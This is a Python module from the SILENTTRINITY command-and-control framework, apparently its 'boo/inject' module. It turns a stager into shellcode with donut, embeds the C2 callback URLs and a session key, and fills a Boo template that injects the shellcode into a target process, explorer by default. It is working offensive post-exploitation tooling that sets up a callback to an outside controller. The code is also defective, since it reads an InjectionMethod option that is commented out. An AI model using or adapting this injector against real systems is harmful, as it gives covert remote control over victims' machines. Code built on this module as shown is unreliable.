import donut
import uuid
import core.events as events
from core.teamserver import ipc_server
from core.teamserver.crypto import gen_stager_psk
from core.utils import shellcode_to_int_byte_array, print_bad
from core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/inject'
        self.language = 'boo'
        self.description = 'Injects a SILENTTRINITY session into the specified process using shellcode'
        self.run_in_thread = False
        self.author = '@byt3bl33d3r'
        self.references = []
        self.options = {
            'Listener': {
                'Description'   :   'Listener to use',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Process': {
                'Description'   :   'Process to inject into',
                'Required'      :   False,
                'Value'         :   'explorer'
            },
            'Architecture' : {
                'Description'   :   'Architecture of process to inject into (x64 or x86) [Warning: getting this wrong will crash things]',
                'Required'      :   False,
                'Value'         :   'x64'
            }
            #'InjectionMethod': {
            #    'Description'   :   'Injection Method',
            #    'Required'      :   False,
            #    'Value'         :   'InjectRemote'
            #}
        }

    def payload(self):
        listener = ipc_server.publish_event(events.GET_LISTENERS, (self.options['Listener']['Value'],))
        if listener:
            c2_urls = ','.join(
                filter(None, [f"{listener.name}://{listener['BindIP']}:{listener['Port']}", listener['CallBackURls']])
            )

            guid = uuid.uuid4()
            psk = gen_stager_psk()
            ipc_server.publish_event(events.SESSION_REGISTER, (guid, psk))

            donut_shellcode = donut.create(file='./core/teamserver/data/naga.exe', params=f"{guid};{psk};{c2_urls}", arch=2 if self.options['Architecture']['Value'] == 'x64' else 1)
            shellcode = shellcode_to_int_byte_array(donut_shellcode)
            if self.options['InjectionMethod']['Value'] == 'InjectRemote':
                with open('core/teamserver/modules/boo/src/injectremote.boo', 'r') as module_src:
                    src = module_src.read()
                    src = src.replace('BYTES', shellcode)
                    src = src.replace('PROCESS', self.options['Process']['Value'])
                    return src
        else:
            print_bad(f"Listener '{self.options['Listener']['Value']}' not found!")
